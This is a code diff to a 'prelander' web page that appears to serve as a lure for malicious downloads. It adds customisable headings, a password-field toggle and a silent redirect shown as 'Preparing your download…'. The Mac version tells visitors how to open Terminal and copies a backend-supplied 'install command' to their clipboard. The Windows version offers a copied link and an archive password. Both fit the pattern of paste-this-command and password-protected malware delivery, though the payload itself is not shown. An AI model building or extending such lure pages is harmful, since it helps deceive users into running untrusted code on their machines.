@@ -103,13 +103,42 @@ export default function PrelanderSlugPage() {
     )
   }
 
+  // Scenario rule: "if there is no active default, the visitor skips the
+  // prelander." The backend flags this when the domain's assigned template is
+  // gone and no active OS default exists — forward the visitor straight to the
+  // offer instead of rendering a prelander with no template.
+  if (data.skip_prelander && data.offer_url) {
+    return <SkipToOffer offerUrl={data.offer_url} />
+  }
+
   if (data.os === 'mac') return <MacPrelander data={data} />
   return <WindowsPrelander data={data} />
+}
+
+/* ─── Skip: no active template → straight to the offer ───────────────────── */
+function SkipToOffer({ offerUrl }: { offerUrl: string }) {
+  useEffect(() => {
+    window.location.replace(offerUrl)
+  }, [offerUrl])
+  return (
+    <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5]">
+      <div className="text-center">
+        <div className="w-8 h-8 border-[3px] border-gray-200 border-t-gray-600 rounded-full animate-spin mx-auto mb-4" />
+        <p className="text-gray-500 text-sm">Preparing your download…</p>
+      </div>
+    </div>
+  )
 }
 
 /* ─── Windows Prelander ──────────────────────────────────────────────────── */
 function WindowsPrelander({ data }: { data: any }) {
   const [copied, setCopied] = useState(false)
+  // Template customisation fields resolved by the backend (assigned template
+  // or OS default); fall back to the historical copy when no template data.
+  const tpl = data?.template
+  const title = tpl?.title ?? 'Your file is ready to download'
+  const subtitle = tpl?.subtitle ?? 'Your file is prepared. Copy the link to download.'
+  const buttonText = tpl?.button_text ?? 'Copy'
 
   const handleCopy = () => {
     if (data?.offer_url) {
@@ -127,8 +156,8 @@ function WindowsPrelander({ data }: { data: any }) {
             <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
               <FileDown size={26} className="text-green-600" />
             </div>
-            <h1 className="text-xl font-bold text-gray-900">Your file is ready to download</h1>
-            <p className="text-sm text-gray-500 mt-2">Your file is prepared. Copy the link to download.</p>
+            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
+            <p className="text-sm text-gray-500 mt-2">{subtitle}</p>
           </div>
 
           <div className="px-6 pb-4">
@@ -141,12 +170,12 @@ function WindowsPrelander({ data }: { data: any }) {
                 className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                   copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
                 }`}>
-                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
+                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> {buttonText}</>}
               </button>
             </div>
           </div>
 
-          {data.password && (
+          {data.password && (tpl?.show_password_field ?? true) && (
             <div className="px-6 pb-4">
               <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
               <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
@@ -168,6 +197,9 @@ function WindowsPrelander({ data }: { data: any }) {
 function MacPrelander({ data }: { data: any }) {
   const [copiedCmd, setCopiedCmd] = useState(false)
   const installCommand = data.offer_url || ''
+  // Template customisation fields — same source as the Windows prelander.
+  const tpl = data?.template
+  const title = tpl?.title ?? 'How to open Terminal on Mac'
 
   const handleCopyCmd = () => {
     navigator.clipboard.writeText(installCommand).catch(() => {})
@@ -184,7 +216,7 @@ function MacPrelander({ data }: { data: any }) {
             <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
               <Terminal size={26} className="text-green-400" />
             </div>
-            <h1 className="text-xl font-bold text-gray-900">How to open Terminal on Mac</h1>
+            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
           </div>
 
           <div className="px-6 pb-5">
